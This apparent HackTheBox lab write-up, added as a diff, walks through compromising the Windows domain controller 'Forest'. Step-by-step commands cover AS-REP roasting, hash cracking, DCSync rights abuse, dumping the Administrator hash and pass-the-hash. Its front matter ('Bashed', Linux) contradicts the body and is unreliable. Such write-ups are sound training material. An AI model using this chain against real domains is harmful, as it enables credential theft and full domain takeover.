@@ -1,0 +1,118 @@
+---
+title: "Bashed"
+platform: "HackTheBox"
+os: "Linux"
+difficulty: "Easy"
+date: 2026-04-06
+encrypted: true
+---
+
+Forest is a Windows Server 2019 Domain Controller on HackTheBox. The path covers null-session RPC enumeration, AS-REP Roasting, BloodHound AD analysis, and ultimately DCSync via an `Exchange Windows Permissions` WriteDacl abuse chain.
+
+## Enumeration
+
+### Port Scan
+
+```bash
+nmap -sV -sC -oN nmap/initial 10.10.10.161
+```
+
+```
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos
+135/tcp  open  msrpc        Microsoft Windows RPC
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds Windows Server 2019 Standard
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)
+9389/tcp open  mc-nmf       .NET Message Framing
+```
+
+Domain: `htb.local` — DC hostname: `FOREST`
+
+### RPC User Enumeration
+
+Null session on RPC is allowed, which lets us enumerate domain accounts:
+
+```bash
+rpcclient -U "" -N 10.10.10.161 -c "enumdomusers"
+```
+
+Among the results: `svc-alfresco` — a service account with **Kerberos Pre-Authentication disabled**.
+
+## Foothold — AS-REP Roasting
+
+When pre-auth is disabled, anyone can request a TGT and receive an encrypted blob crackable offline.
+
+```bash
+impacket-GetNPUsers htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
+```
+
+```
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:1c40e55f...
+```
+
+Crack offline with hashcat:
+
+```bash
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+# Result: s3rvice
+```
+
+WinRM access confirmed:
+
+```bash
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
+```
+
+**User flag** → `C:\Users\svc-alfresco\Desktop\user.txt`
+
+## Lateral Movement — BloodHound
+
+Collect AD data with SharpHound and ingest into BloodHound.
+
+Key finding: `svc-alfresco` → member of `Account Operators` → `GenericAll` on `Exchange Windows Permissions` → **WriteDacl on the domain object**.
+
+This means we can grant ourselves DCSync rights.
+
+## Privilege Escalation — DCSync
+
+```powershell
+# Add svc-alfresco to Exchange Windows Permissions
+net group "Exchange Windows Permissions" svc-alfresco /add /domain
+
+# Grant DCSync (DS-Replication-Get-Changes-All)
+$Cred = New-Object System.Management.Automation.PSCredential(
+  'htb\svc-alfresco',
+  (ConvertTo-SecureString 's3rvice' -AsPlainText -Force)
+)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" `
+  -PrincipalIdentity svc-alfresco -Rights DCSync
+```
+
+Dump all hashes:
+
+```bash
+impacket-secretsdump htb/svc-alfresco:'s3rvice'@10.10.10.161
+```
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+```
+
+Pass-the-Hash for SYSTEM shell:
+
+```bash
+impacket-psexec -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+```
+
+**Root flag** → `C:\Users\Administrator\Desktop\root.txt`
+
+## Summary
+
+| Step | Technique |
+|------|-----------|
+| Recon | Nmap, RPC null session |
+| Foothold | AS-REP Roasting + hashcat |
+| Access | Evil-WinRM |
+| PrivEsc | BloodHound → WriteDacl → DCSync → PTH |
